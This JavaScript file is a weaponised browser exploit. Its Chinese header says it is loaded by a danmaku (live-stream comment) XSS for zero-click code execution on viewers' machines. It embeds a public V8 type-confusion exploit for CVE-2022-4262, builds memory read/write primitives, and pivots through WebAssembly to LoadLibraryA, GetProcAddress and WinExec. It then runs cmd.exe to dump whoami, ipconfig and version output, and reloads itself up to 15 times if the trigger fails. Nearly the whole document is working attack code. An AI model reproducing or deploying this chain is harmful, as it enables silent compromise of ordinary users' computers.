
/* ================= x.js —— 观众 0-click RCE payload（自加载重试版）=================
   由弹幕 XSS 加载执行；触发是概率性的，失败则用 <script> 重新加载自己（带 ?r=N）重试。
   CVE-2022-4262 → 任意读写 → LoadLibraryA/GetProcAddress → WinExec
   条件：不需要任何 flag、不写代码页（CEF 默认配置）
   ================================================================================= */
(function(){
var MAX_RETRY = 15;
var selfUrl = null;
try { selfUrl = (document.currentScript && document.currentScript.src) || null; } catch(e){}
function selfRetry(n){
  try {
    if (!selfUrl) return;
    if (n > MAX_RETRY) { window.__rce="gave up after "+MAX_RETRY; return; }
    var base = selfUrl.split("?")[0];
    var s = document.createElement("script");
    s.src = base + "?r=" + n + "&t=" + Date.now();
    (document.head||document.documentElement).appendChild(s);
  } catch(e){}
}
try{
  /* ---------- 触发前：准备 buffer / wasm（顺序不能改）---------- */
  var CMDSTR = "cmd.exe /c whoami> C:/Windows/Temp/wh.txt & ipconfig /all> C:/Windows/Temp/ip.txt & ver> C:/Windows/Temp/ver.txt";
  var cmdAB=new ArrayBuffer(0x200), nameAB=new ArrayBuffer(0x40), dllAB=new ArrayBuffer(0x40);
  var rw_ab=new ArrayBuffer(0x20000), rw_ta=new BigUint64Array(rw_ab);
  var cmdU8=new Uint8Array(cmdAB), nameU8=new Uint8Array(nameAB), dllU8=new Uint8Array(dllAB);
  var NAMESTR="WinExec", DLLSTR="kernel32.dll";
  for(var i=0;i<CMDSTR.length;i++)cmdU8[i]=CMDSTR.charCodeAt(i);
  for(var i=0;i<NAMESTR.length;i++)nameU8[i]=NAMESTR.charCodeAt(i);
  for(var i=0;i<DLLSTR.length;i++)dllU8[i]=DLLSTR.charCodeAt(i);
  function leb(n){var a=[];do{var x=n&0x7f;n>>>=7;if(n)x|=0x80;a.push(x);}while(n);return a;}
  function buildRouteB(np,ret){var t=[0x60,np];for(var i=0;i<np;i++)t.push(0x7e);t.push(0x01,ret);
   var bd=[0x00];for(var i=0;i<np;i++)bd.push(0x20,i);bd.push(0x10,0x00,0x0b);
   var m=[0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00];
   var s1=leb(t.length+1); m.push(0x01);for(var q=0;q<s1.length;q++)m.push(s1[q]);m.push(0x01);for(var q=0;q<t.length;q++)m.push(t[q]);
   m.push(0x02,0x0b,0x01,0x03,0x65,0x6e,0x76,0x03,0x69,0x6d,0x70,0x00,0x00);
   m.push(0x03,0x02,0x01,0x00);
   m.push(0x07,0x07,0x01,0x03,0x70,0x77,0x6e,0x00,0x01);
   var s2=leb(bd.length+2);m.push(0x0a);for(var q=0;q<s2.length;q++)m.push(s2[q]);m.push(0x01);var s3=leb(bd.length);for(var q=0;q<s3.length;q++)m.push(s3[q]);
   for(var q=0;q<bd.length;q++)m.push(bd[q]);
   return new Uint8Array(m);}
  /* ---------- ① 触发 CVE-2022-4262 ---------- */
// Exploit for CVE-2022-4262
// author: @mistymntncop
// based on the ITW exploit (author unknown) found by @_clem1
//
// Build d8 using:
// a) Run once
//    git checkout 18865d6af0404f2d2aeb1c99dd73503364ce0967
//    gclient sync
//
//    If you want to DebugPrint the feedback vector apply the patch with
//    (make sure you are in the root V8 folder):
//    git apply C:\path\to\patch\dbg.patch
//
//    You can revert the patch with:
//    git apply -R C:\path\to\patch\dbg.patch
//
// b) Run per each compilation
//
//    Debug Build:
//    py ./tools/dev/gm.py x64.debug
//
//    Release Build:
//    py ./tools/dev/gm.py x64.release
//
// Run:
// C:\path\to\v8\d8.exe --allow-natives-syntax exploit.js
//
// if this does not work for you try the "bytecode-old-age" flag.
// C:\path\to\v8\d8.exe --allow-natives-syntax --bytecode-old-age=3 exploit.js

var conv_ab = new ArrayBuffer(8);
var conv_f64 = new Float64Array(conv_ab);
var conv_b64 = new BigInt64Array(conv_ab);

function dtoi(f) {
    conv_f64[0] = f;
    return conv_b64[0];
}

function itod(i) {
    conv_b64[0] = i;
    return conv_f64[0];
}

function ptr(addr) {
    return addr | 1n;
}
function unptr(addr) {
    return addr & ~3n;
}

function smi(i) {
    return i << 1n;
}
function unsmi(i) {
    return i >> 1n;
}

const FIXED_ARRAY_HEADER_SIZE = 8n;
var large_arr = new Array(0x10000);
large_arr.fill(itod(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
var packed_map = null;
var packed_double_map = null;
var packed_double_props = null;
var fake_arr_elements_addr = null;
var fake_arr = null;

function fake_obj(addr) {
    large_arr[0] = itod(packed_map | (packed_double_props << 32n));
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));
    large_arr[3] = itod(ptr(addr));

    let result = fake_arr[0];

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));

    return result;
}


function addr_of(obj) {
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));

    fake_arr[0] = obj;
    let result = dtoi(large_arr[3]) & 0xFFFFFFFFn;

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));

    return result;
}

function v8_read64(addr) {
    addr -= FIXED_ARRAY_HEADER_SIZE;

    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));

    let result = dtoi(fake_arr[0]);

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));

    return result;
}

function v8_write64(addr, val) {
    addr -= FIXED_ARRAY_HEADER_SIZE;

    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));

    fake_arr[0] = itod(val);

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
}

function gc_minor() { //scavenge
    for(let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function gc_major() { //mark-sweep
    new ArrayBuffer(0x7fe00000);
}

//https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/18865d6af0404f2d2aeb1c99dd73503364ce0967:src/flags/flag-definitions.h;l=1444
function flush_bytecode() {
    //please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
    //you can observe if this is working by passing the "--trace-gc" flag
    const bytecode_old_age = 5;
    for(let i = 0; i < (bytecode_old_age+1); i++) {
        //doesn't seem to matter if the allocation fails
        try {
            gc_major();
        } catch(err) {
            //print(err);
        }
    }
}

function make_small() {
    let result = {};
    result.p1 = 1;
    return result;
}

function make_big() {
    //These are all inline properties. If we make a smaller object have the
    //same MAP as this then we will be able to access out of bounds.
    let result = {
        p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10,
        p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18
    };
    //We need to add the extra property to transition to a new MAP with a cleared
    //validity cell. Also, the extra field is external and captures the write so
    //that doesn't interfere with our inline properties.
    result.extra = 1;
    return result;
}
var ballast = null;
var small_obj = make_small();
var big_obj = make_big();
var corrupted_obj = null;
var arr1 = null;
var arr2 = null;

//We use the SetNamedProperty instruction to cause memory corruption. This instruction
//uses the SetNamedStrict feedback vector slots.
//In this example, before we trigger GC the first SetNamedStrict is at slot #4. After GC it
//is at slot #8. This slot now points to controlled feedback. Specifically, the
//first SetNamedStrict slot #8 contains the corrupted_obj MAP (small_obj MAP) and the
//second SetNamedStrict slot #9 contains the MAP we want to transition to (big_obj MAP).

//First 10 iterations of the loop installs the feedback vector and seeds it with feedback.
//The 11th iteration triggers the vuln and changes the MAP of corrupted_obj.
for(let i = 0; i < 11; i++) {
    //this prevents bad results from LoadGlobalNotInsideTypeof slots from crashing the exploit
    function dummy() { return true; }

    //use locals here instead of globals because otherwise it would create extra slots in the feedback vector
    let target = {}; //placeholder - this is the object we want to change the MAP of.
    let SetNamedStrict_slot1 = {}; //this gets transitioned to "small_obj" MAP once we add property p1
    let LoadProperty_slot0 = big_obj; //this is the MAP we want to transition to.
    if(i == 10) {
        //this causes the bytecode to be thrown away
        flush_bytecode();
        //allocate all the objects after GC so that they are allocated in NewSpace
        corrupted_obj = make_small();
        target = corrupted_obj;
        arr1 = [1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310]; //0x0000222200002222
        arr2 = [large_arr,2,3,4,5,6,7,8];
    }

    //This will cause corrupted_obj (small_obj MAP) to transition to a big_obj MAP
    //Unfortunately because of the nature of the vulnerability we cant put this in it's own function :-(
    ((a = class Clazz {
       [(dummy(
            eval(),
            eval, //consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
            eval, //consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
            target.p1 = 123, //this is where the target SetNamedStrict slot will be
            [], //this Literal (AllocationSite) uses one feedback slot. This is important. Slot value has to be a valid pointer!
            SetNamedStrict_slot1.p1 = 1, //small_obj MAP will be in the second SetNamedStrict slot
            LoadProperty_slot0.p1 //big_obj MAP will be in the first LoadProperty slot
        )
        ? 0 : (ballast = 1)) //this crap is to make sure the slot length of the feedback vector and feedback metadata are equal
       ]
    }) => {})();
}
//*
corrupted_obj.p18 = 0x30; //modify length of arr1 array

let large_arr_addr = dtoi(arr1[7]) & 0xFFFFFFFFn;
let large_arr_elements_field_addr = large_arr_addr + 8n;

let packed_double_map_and_props = dtoi(arr1[4]);
packed_double_map = packed_double_map_and_props & 0xFFFFFFFFn;
packed_double_props = packed_double_map_and_props >> 32n;
let packed_double_elements = dtoi(arr1[5]) & 0xFFFFFFFFn;

let packed_map_and_props = dtoi(arr1[11]);
packed_map = packed_map_and_props & 0xFFFFFFFFn;
let packed_props = packed_map_and_props >> 32n;

let fixed_arr_map = dtoi(arr1[6]) & 0xFFFFFFFFn;

arr1[0] = itod(packed_double_map | (packed_double_props << 32n));
arr1[1] = itod((large_arr_elements_field_addr - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));

let temp_fake_arr_addr = packed_double_elements + FIXED_ARRAY_HEADER_SIZE;
arr1[7] = itod(temp_fake_arr_addr);
let temp_fake_arr = arr2[0];
let large_arr_elements_addr = dtoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
temp_fake_arr = null;

let fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
fake_arr_elements_addr = fake_arr_addr + 16n;

large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
large_arr[2] = itod(fixed_arr_map | (smi(0n) << 32n));

arr1[7] = itod(fake_arr_addr);
fake_arr = arr2[0];

//cleanup
corrupted_obj.p18 = 4;
let small_obj_addr = addr_of(small_obj);
let small_obj_map_and_props = v8_read64(small_obj_addr);
let corrupted_obj_addr = addr_of(corrupted_obj);
v8_write64(corrupted_obj_addr, small_obj_map_and_props); //restore the corrupted MAP
corrupted_obj = null;




//*/

  /* ---------- ② 利用（只有触发成功才做）---------- */
  if (large_arr_addr === 0 || large_arr_addr === undefined) {
    window.__rce = "trigger failed (attempt)";
    selfRetry((parseInt((selfUrl||"").replace(/.*[?&]r=(\d+).*/,"$1"),10)||0) + 1);
  } else {
    var g_inst=new WebAssembly.Instance(new WebAssembly.Module(buildRouteB(12,0x7e)),{env:{imp:function(){return 0x4321n;}}});
    var fnA=addr_of(document.createElement);
    var sfi=v8_read64(fnA+0x0Cn)&0xFFFFFFFFn;
    var fti=v8_read64(sfi+0x04n)&0xFFFFFFFFn;
    var cc =v8_read64(fti+0x18n)&0xFFFFFFFFn;
    var cb =v8_read64(cc +0x08n);
    var base=cb-0x825C020n;
    var IAT=base+0xA3C8598n;
    var f=addr_of(rw_ta)+0x2Cn;
    v8_write64(f, IAT-0x400n);
    var off=0x400;
    var LLA=rw_ta[(off+248*8)>>3];
    var GPA=rw_ta[(off+153*8)>>3];
    var IFT0=v8_read64(addr_of(g_inst)+0x30n);
    v8_write64(f, IFT0);
    var dllP=v8_read64(addr_of(dllAB)+0x1Cn);
    var nameP=v8_read64(addr_of(nameAB)+0x1Cn);
    var cmdP=v8_read64(addr_of(cmdAB)+0x1Cn);
    rw_ta[0]=LLA;
    var kb=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,0n,dllP,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
    rw_ta[0]=GPA;
    var we=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,nameP,kb,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
    rw_ta[0]=we;
    var r=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,5n,cmdP,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
    window.__rce="OK ret=0x"+r.toString(16)+" trigger="+String(large_arr_addr)+" base=0x"+base.toString(16)+" we=0x"+we.toString(16);
  }
}catch(e){ window.__rce="ERR:"+e.message; }
})();
